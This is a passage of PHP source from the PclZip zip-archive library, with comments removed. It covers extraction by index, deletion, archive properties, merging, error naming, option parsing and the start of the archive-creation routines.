                                                 PCLZIP_OPT_BY_NAME => 'optional',
                                                 PCLZIP_OPT_BY_EREG => 'optional',
                                                 PCLZIP_OPT_BY_PREG => 'optional',
                                                 PCLZIP_OPT_BY_INDEX => 'optional',
                                                 PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                 PCLZIP_OPT_EXTRACT_IN_OUTPUT => 'optional',
                                                 PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                 ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                 ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
											    ));
      if ($v_result != 1) {
        return 0;
      }

      if (isset($v_options[PCLZIP_OPT_PATH])) {
        $v_path = $v_options[PCLZIP_OPT_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) {
        $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
        $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
        if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) {
          $v_path .= '/';
        }
        $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
      }
    }

    else {

      $v_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_remove_path = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }

  $this->privOptionDefaultThreshold($v_options);


  $p_list = array();
  $v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path,
                                     $v_remove_all_path, $v_options);
  if ($v_result < 1) {
    unset($p_list);
    return(0);
  }

  return $p_list;
}



function extractByIndex($p_index)
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();
  $v_path = '';
  $v_remove_path = "";
  $v_remove_all_path = false;

  $v_size = func_num_args();

  $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                 PCLZIP_CB_POST_EXTRACT => 'optional',
                                                 PCLZIP_OPT_SET_CHMOD => 'optional',
                                                 PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                 ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                 ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
											   ));
      if ($v_result != 1) {
        return 0;
      }

      if (isset($v_options[PCLZIP_OPT_PATH])) {
        $v_path = $v_options[PCLZIP_OPT_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) {
        $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
        $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
        if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) {
          $v_path .= '/';
        }
        $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
      }
      if (!isset($v_options[PCLZIP_OPT_EXTRACT_AS_STRING])) {
        $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;
      }
      else {
      }
    }

    else {

      $v_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_remove_path = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }


  $v_arg_trick = array (PCLZIP_OPT_BY_INDEX, $p_index);
  $v_options_trick = array();
  $v_result = $this->privParseOptions($v_arg_trick, sizeof($v_arg_trick), $v_options_trick,
                                      array (PCLZIP_OPT_BY_INDEX => 'optional' ));
  if ($v_result != 1) {
      return 0;
  }
  $v_options[PCLZIP_OPT_BY_INDEX] = $v_options_trick[PCLZIP_OPT_BY_INDEX];

  $this->privOptionDefaultThreshold($v_options);

  if (($v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path, $v_remove_all_path, $v_options)) < 1) {
      return(0);
  }

  return $p_list;
}

function delete()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();

  $v_size = func_num_args();

  if ($v_size > 0) {
    $v_arg_list = func_get_args();

    $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                      array (PCLZIP_OPT_BY_NAME => 'optional',
                                             PCLZIP_OPT_BY_EREG => 'optional',
                                             PCLZIP_OPT_BY_PREG => 'optional',
                                             PCLZIP_OPT_BY_INDEX => 'optional' ));
    if ($v_result != 1) {
        return 0;
    }
  }

  $this->privDisableMagicQuotes();

  $v_list = array();
  if (($v_result = $this->privDeleteByRule($v_list, $v_options)) != 1) {
    $this->privSwapBackMagicQuotes();
    unset($v_list);
    return(0);
  }

  $this->privSwapBackMagicQuotes();

  return $v_list;
}

function deleteByIndex($p_index)
{
  
  $p_list = $this->delete(PCLZIP_OPT_BY_INDEX, $p_index);

  return $p_list;
}

function properties()
{

  $this->privErrorReset();

  $this->privDisableMagicQuotes();

  if (!$this->privCheckFormat()) {
    $this->privSwapBackMagicQuotes();
    return(0);
  }

  $v_prop = array();
  $v_prop['comment'] = '';
  $v_prop['nb'] = 0;
  $v_prop['status'] = 'not_exist';

  if (@is_file($this->zipname))
  {
    if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0)
    {
      $this->privSwapBackMagicQuotes();
      
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');

      return 0;
    }

    $v_central_dir = array();
    if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
    {
      $this->privSwapBackMagicQuotes();
      return 0;
    }

    $this->privCloseFd();

    $v_prop['comment'] = $v_central_dir['comment'];
    $v_prop['nb'] = $v_central_dir['entries'];
    $v_prop['status'] = 'ok';
  }

  $this->privSwapBackMagicQuotes();

  return $v_prop;
}

function duplicate($p_archive)
{
  $v_result = 1;

  $this->privErrorReset();

  if ((is_object($p_archive)) && (get_class($p_archive) == 'pclzip'))
  {

    $v_result = $this->privDuplicate($p_archive->zipname);
  }

  else if (is_string($p_archive))
  {

    if (!is_file($p_archive)) {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "No file with filename '".$p_archive."'");
      $v_result = PCLZIP_ERR_MISSING_FILE;
    }
    else {
      $v_result = $this->privDuplicate($p_archive);
    }
  }

  else
  {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_archive_to_add");
    $v_result = PCLZIP_ERR_INVALID_PARAMETER;
  }

  return $v_result;
}

function merge($p_archive_to_add)
{
  $v_result = 1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  if ((is_object($p_archive_to_add)) && (get_class($p_archive_to_add) == 'pclzip'))
  {

    $v_result = $this->privMerge($p_archive_to_add);
  }

  else if (is_string($p_archive_to_add))
  {

    $v_object_archive = new PclZip($p_archive_to_add);

    $v_result = $this->privMerge($v_object_archive);
  }

  else
  {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_archive_to_add");
    $v_result = PCLZIP_ERR_INVALID_PARAMETER;
  }

  return $v_result;
}



function errorCode()
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    return(PclErrorCode());
  }
  else {
    return($this->error_code);
  }
}

function errorName($p_with_code=false)
{
  $v_name = array ( PCLZIP_ERR_NO_ERROR => 'PCLZIP_ERR_NO_ERROR',
                    PCLZIP_ERR_WRITE_OPEN_FAIL => 'PCLZIP_ERR_WRITE_OPEN_FAIL',
                    PCLZIP_ERR_READ_OPEN_FAIL => 'PCLZIP_ERR_READ_OPEN_FAIL',
                    PCLZIP_ERR_INVALID_PARAMETER => 'PCLZIP_ERR_INVALID_PARAMETER',
                    PCLZIP_ERR_MISSING_FILE => 'PCLZIP_ERR_MISSING_FILE',
                    PCLZIP_ERR_FILENAME_TOO_LONG => 'PCLZIP_ERR_FILENAME_TOO_LONG',
                    PCLZIP_ERR_INVALID_ZIP => 'PCLZIP_ERR_INVALID_ZIP',
                    PCLZIP_ERR_BAD_EXTRACTED_FILE => 'PCLZIP_ERR_BAD_EXTRACTED_FILE',
                    PCLZIP_ERR_DIR_CREATE_FAIL => 'PCLZIP_ERR_DIR_CREATE_FAIL',
                    PCLZIP_ERR_BAD_EXTENSION => 'PCLZIP_ERR_BAD_EXTENSION',
                    PCLZIP_ERR_BAD_FORMAT => 'PCLZIP_ERR_BAD_FORMAT',
                    PCLZIP_ERR_DELETE_FILE_FAIL => 'PCLZIP_ERR_DELETE_FILE_FAIL',
                    PCLZIP_ERR_RENAME_FILE_FAIL => 'PCLZIP_ERR_RENAME_FILE_FAIL',
                    PCLZIP_ERR_BAD_CHECKSUM => 'PCLZIP_ERR_BAD_CHECKSUM',
                    PCLZIP_ERR_INVALID_ARCHIVE_ZIP => 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP',
                    PCLZIP_ERR_MISSING_OPTION_VALUE => 'PCLZIP_ERR_MISSING_OPTION_VALUE',
                    PCLZIP_ERR_INVALID_OPTION_VALUE => 'PCLZIP_ERR_INVALID_OPTION_VALUE',
                    PCLZIP_ERR_UNSUPPORTED_COMPRESSION => 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION',
                    PCLZIP_ERR_UNSUPPORTED_ENCRYPTION => 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION'
                    ,PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE => 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE'
                    ,PCLZIP_ERR_DIRECTORY_RESTRICTION => 'PCLZIP_ERR_DIRECTORY_RESTRICTION'
                  );

  if (isset($v_name[$this->error_code])) {
    $v_value = $v_name[$this->error_code];
  }
  else {
    $v_value = 'NoName';
  }

  if ($p_with_code) {
    return($v_value.' ('.$this->error_code.')');
  }
  else {
    return($v_value);
  }
}

function errorInfo($p_full=false)
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    return(PclErrorString());
  }
  else {
    if ($p_full) {
      return($this->errorName(true)." : ".$this->error_string);
    }
    else {
      return($this->error_string." [code ".$this->error_code."]");
    }
  }
}





function privCheckFormat($p_level=0)
{
  $v_result = true;

  clearstatcache();

  $this->privErrorReset();

  if (!is_file($this->zipname)) {
    PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "Missing archive file '".$this->zipname."'");
    return(false);
  }

  if (!is_readable($this->zipname)) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to read archive '".$this->zipname."'");
    return(false);
  }




  return $v_result;
}

function privParseOptions(&$p_options_list, $p_size, &$v_result_list, $v_requested_options=false)
{
  $v_result=1;
  
  $i=0;
  while ($i<$p_size) {

    if (!isset($v_requested_options[$p_options_list[$i]])) {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid optional parameter '".$p_options_list[$i]."' for this method");

      return PclZip::errorCode();
    }

    switch ($p_options_list[$i]) {
      case PCLZIP_OPT_PATH :
      case PCLZIP_OPT_REMOVE_PATH :
      case PCLZIP_OPT_ADD_PATH :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
        $i++;
      break;

      case PCLZIP_OPT_TEMP_FILE_THRESHOLD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");
          return PclZip::errorCode();
        }
        
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_OFF])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_OFF'");
          return PclZip::errorCode();
        }
        
        $v_value = $p_options_list[$i+1];
        if ((!is_integer($v_value)) || ($v_value<0)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Integer expected for option '".PclZipUtilOptionText($p_options_list[$i])."'");
          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $v_value*1048576;
        $i++;
      break;

      case PCLZIP_OPT_TEMP_FILE_ON :
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_OFF])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_OFF'");
          return PclZip::errorCode();
        }
        
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_TEMP_FILE_OFF :
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_ON])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_ON'");
          return PclZip::errorCode();
        }
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_THRESHOLD])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_THRESHOLD'");
          return PclZip::errorCode();
        }
        
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_EXTRACT_DIR_RESTRICTION :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (   is_string($p_options_list[$i+1])
            && ($p_options_list[$i+1] != '')) {
          $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
          $i++;
        }
        else {
        }
      break;

      case PCLZIP_OPT_BY_NAME :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]][0] = $p_options_list[$i+1];
        }
        else if (is_array($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_BY_EREG :
        $p_options_list[$i] = PCLZIP_OPT_BY_PREG;
      case PCLZIP_OPT_BY_PREG :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_COMMENT :
      case PCLZIP_OPT_ADD_COMMENT :
      case PCLZIP_OPT_PREPEND_COMMENT :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE,
		                     "Missing parameter value for option '"
							 .PclZipUtilOptionText($p_options_list[$i])
							 ."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE,
		                     "Wrong parameter value for option '"
							 .PclZipUtilOptionText($p_options_list[$i])
							 ."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_BY_INDEX :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_work_list = array();
        if (is_string($p_options_list[$i+1])) {

            $p_options_list[$i+1] = strtr($p_options_list[$i+1], ' ', '');

            $v_work_list = explode(",", $p_options_list[$i+1]);
        }
        else if (is_integer($p_options_list[$i+1])) {
            $v_work_list[0] = $p_options_list[$i+1].'-'.$p_options_list[$i+1];
        }
        else if (is_array($p_options_list[$i+1])) {
            $v_work_list = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Value must be integer, string or array for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        
        $v_sort_flag=false;
        $v_sort_value=0;
        for ($j=0; $j<sizeof($v_work_list); $j++) {
            $v_item_list = explode("-", $v_work_list[$j]);
            $v_size_item_list = sizeof($v_item_list);
            
            
            if ($v_size_item_list == 1) {
                $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[0];
            }
            elseif ($v_size_item_list == 2) {
                $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[1];
            }
            else {
                PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Too many values in index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");

                return PclZip::errorCode();
            }


            if ($v_result_list[$p_options_list[$i]][$j]['start'] < $v_sort_value) {
                $v_sort_flag=true;

                PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Invalid order of index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");

                return PclZip::errorCode();
            }
            $v_sort_value = $v_result_list[$p_options_list[$i]][$j]['start'];
        }
        
        if ($v_sort_flag) {
        }

        $i++;
      break;

      case PCLZIP_OPT_REMOVE_ALL_PATH :
      case PCLZIP_OPT_EXTRACT_AS_STRING :
      case PCLZIP_OPT_NO_COMPRESSION :
      case PCLZIP_OPT_EXTRACT_IN_OUTPUT :
      case PCLZIP_OPT_REPLACE_NEWER :
      case PCLZIP_OPT_STOP_ON_ERROR :
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_SET_CHMOD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        $i++;
      break;

      case PCLZIP_CB_PRE_EXTRACT :
      case PCLZIP_CB_POST_EXTRACT :
      case PCLZIP_CB_PRE_ADD :
      case PCLZIP_CB_POST_ADD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_function_name = $p_options_list[$i+1];

        if (!function_exists($v_function_name)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Function '".$v_function_name."()' is not an existing function for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $v_function_name;
        $i++;
      break;

      default :
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                       "Unknown parameter '"
						   .$p_options_list[$i]."'");

        return PclZip::errorCode();
    }

    $i++;
  }

  if ($v_requested_options !== false) {
    for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
      if ($v_requested_options[$key] == 'mandatory') {
        if (!isset($v_result_list[$key])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");

          return PclZip::errorCode();
        }
      }
    }
  }
  
  if (!isset($v_result_list[PCLZIP_OPT_TEMP_FILE_THRESHOLD])) {
    
  }

  return $v_result;
}

function privOptionDefaultThreshold(&$p_options)
{
  $v_result=1;
  
  if (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
      || isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) {
    return $v_result;
  }
  
  $v_memory_limit = ini_get('memory_limit');
  $v_memory_limit = trim($v_memory_limit);
  $last = strtolower(substr($v_memory_limit, -1));

  if($last == 'g')
      $v_memory_limit = $v_memory_limit*1073741824;
  if($last == 'm')
      $v_memory_limit = $v_memory_limit*1048576;
  if($last == 'k')
      $v_memory_limit = $v_memory_limit*1024;
          
  $p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] = floor($v_memory_limit*PCLZIP_TEMPORARY_FILE_RATIO);
  

  if ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] < 1048576) {
    unset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD]);
  }
        
  return $v_result;
}

function privFileDescrParseAtt(&$p_file_list, &$p_filedescr, $v_options, $v_requested_options=false)
{
  $v_result=1;
  
  foreach ($p_file_list as $v_key => $v_value) {
  
    if (!isset($v_requested_options[$v_key])) {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file attribute '".$v_key."' for this file");

      return PclZip::errorCode();
    }

    switch ($v_key) {
      case PCLZIP_ATT_FILE_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['filename'] = PclZipUtilPathReduction($v_value);
        
        if ($p_filedescr['filename'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

      break;

      case PCLZIP_ATT_FILE_NEW_SHORT_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['new_short_name'] = PclZipUtilPathReduction($v_value);

        if ($p_filedescr['new_short_name'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty short filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }
      break;

      case PCLZIP_ATT_FILE_NEW_FULL_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['new_full_name'] = PclZipUtilPathReduction($v_value);

        if ($p_filedescr['new_full_name'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty full filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }
      break;

      case PCLZIP_ATT_FILE_COMMENT :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['comment'] = $v_value;
      break;

      case PCLZIP_ATT_FILE_MTIME :
        if (!is_integer($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". Integer expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['mtime'] = $v_value;
      break;

      case PCLZIP_ATT_FILE_CONTENT :
        $p_filedescr['content'] = $v_value;
      break;

      default :
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                           "Unknown parameter '".$v_key."'");

        return PclZip::errorCode();
    }

    if ($v_requested_options !== false) {
      for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
        if ($v_requested_options[$key] == 'mandatory') {
          if (!isset($p_file_list[$key])) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");
            return PclZip::errorCode();
          }
        }
      }
    }
  
  }
  
  return $v_result;
}

function privFileDescrExpand(&$p_filedescr_list, &$p_options)
{
  $v_result=1;
  
  $v_result_list = array();
  
  for ($i=0; $i<sizeof($p_filedescr_list); $i++) {
    
    $v_descr = $p_filedescr_list[$i];
    
    $v_descr['filename'] = PclZipUtilTranslateWinPath($v_descr['filename'], false);
    $v_descr['filename'] = PclZipUtilPathReduction($v_descr['filename']);
    
    if (file_exists($v_descr['filename'])) {
      if (@is_file($v_descr['filename'])) {
        $v_descr['type'] = 'file';
      }
      else if (@is_dir($v_descr['filename'])) {
        $v_descr['type'] = 'folder';
      }
      else if (@is_link($v_descr['filename'])) {
        continue;
      }
      else {
        continue;
      }
    }
    
    else if (isset($v_descr['content'])) {
      $v_descr['type'] = 'virtual_file';
    }
    
    else {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$v_descr['filename']."' does not exist");

      return PclZip::errorCode();
    }
    
    $this->privCalculateStoredFilename($v_descr, $p_options);
    
    $v_result_list[sizeof($v_result_list)] = $v_descr;
    
    if ($v_descr['type'] == 'folder') {
      $v_dirlist_descr = array();
      $v_dirlist_nb = 0;
      if ($v_folder_handler = @opendir($v_descr['filename'])) {
        while (($v_item_handler = @readdir($v_folder_handler)) !== false) {

          if (($v_item_handler == '.') || ($v_item_handler == '..')) {
              continue;
          }
          
          $v_dirlist_descr[$v_dirlist_nb]['filename'] = $v_descr['filename'].'/'.$v_item_handler;
          
          if (($v_descr['stored_filename'] != $v_descr['filename'])
               && (!isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH]))) {
            if ($v_descr['stored_filename'] != '') {
              $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_descr['stored_filename'].'/'.$v_item_handler;
            }
            else {
              $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_item_handler;
            }
          }
    
          $v_dirlist_nb++;
        }
        
        @closedir($v_folder_handler);
      }
      else {
      }
      
      if ($v_dirlist_nb != 0) {
        if (($v_result = $this->privFileDescrExpand($v_dirlist_descr, $p_options)) != 1) {
          return $v_result;
        }
        
        $v_result_list = array_merge($v_result_list, $v_dirlist_descr);
      }
      else {
      }
        
      unset($v_dirlist_descr);
    }
  }
  
  $p_filedescr_list = $v_result_list;

  return $v_result;
}

function privCreate($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();
  
  $this->privDisableMagicQuotes();

  if (($v_result = $this->privOpenFd('wb')) != 1)
  {
    return $v_result;
  }

  $v_result = $this->privAddList($p_filedescr_list, $p_result_list, $p_options);

  $this->privCloseFd();

  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privAdd($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();

  if ((!is_file($this->zipname)) || (filesize($this->zipname) == 0))
  {

    $v_result = $this->privCreate($p_filedescr_list, $p_result_list, $p_options);

    return $v_result;
  }
  $this->privDisableMagicQuotes();

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  @rewind($this->zip_fd);

  $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

  if (($v_zip_temp_fd = @fopen($v_zip_temp_name, 'wb')) == 0)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();

